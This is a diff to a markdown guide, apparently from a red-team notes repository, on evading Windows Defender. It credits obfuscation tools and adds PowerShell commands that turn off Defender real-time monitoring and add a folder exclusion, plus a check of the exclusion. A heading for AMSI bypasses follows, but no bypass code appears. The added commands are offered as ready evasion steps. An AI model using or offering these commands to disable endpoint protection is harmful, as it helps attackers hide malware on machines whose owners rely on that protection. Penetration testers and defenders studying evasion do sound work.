@@ -26,10 +26,23 @@ Credit Info: I have obtained a lot of this info through other Github repos, blog
 - https://github.com/loadenmb/tvasion
 - https://github.com/mkaring/ConfuserEx
 
-# Step one off evading Defender
+# Easiest way to evading Defender (Requires elevation)
 
-First try turning of Windows Defender:
+Turning off Windows Defender:
 ```Set-MpPreference -DisableRealtimeMonitoring $true```
+
+# Another easy way to evade Defender (Requires elevation)
+
+Adding a folder exclusion
+```Add-MpPreference -ExclusionPath "C:\temp"```
+
+Checking exclusions
+```Get-MpPreference | Select-Object -Property ExclusionPath
+
+ExclusionPath
+-------------
+{C:\temp}
+```
 
 # AMSI bypasses (working as of 17/01/2022)
 
